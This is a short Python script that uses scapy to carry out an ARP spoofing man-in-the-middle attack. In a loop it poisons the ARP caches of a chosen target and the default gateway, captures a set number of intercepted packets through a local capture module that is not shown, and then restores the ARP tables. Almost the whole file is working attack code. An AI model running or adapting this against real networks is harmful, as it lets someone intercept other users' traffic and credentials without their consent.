import logging
logging.getLogger("scapy.runtime").setLevel(logging.ERROR)
import dr
import scapy.all as scapy
import capture


import time

ip_gateway = ""
ip_target = ""

def spoof(target_ip, spoof_ip):
    packet = scapy.ARP(op = 2, pdst = target_ip, hwdst = scapy.getmacbyip(target_ip), psrc = spoof_ip)
    scapy.send(packet, verbose = False)
    
   
def restore(destination_ip, source_ip):
    destination_mac = scapy.getmacbyip(destination_ip)
    source_mac = scapy.getmacbyip(source_ip)
    packet = scapy.ARP(op = 2, pdst = destination_ip, hwdst = destination_mac, psrc = source_ip, hwsrc = source_mac)
    scapy.send(packet, verbose = False)
  



def algo(mac,ip,a):
    interval = 4
    ip_target = ip
    ip_gateway = dr.router()
    
    packets = ""
    count = 0
    try:
        i = 1
        while True:
          
          spoof(ip_target, ip_gateway)# from spoof device to default gateway
          spoof(ip_gateway, ip_target)# from default gateway to spoof device
          print(len(packets))
          if(count == 0):
              packets = capture.start(mac,ip,a)
              count = 1
          elif(len(packets) == a):
              restore(ip_gateway, ip_target)
              restore(ip_target, ip_gateway)
              print("completed")
              break
          time.sleep(interval)
          
          
    except KeyboardInterrupt:
        restore(ip_gateway, ip_target)
        restore(ip_target, ip_gateway)
        #capture.store(packets)


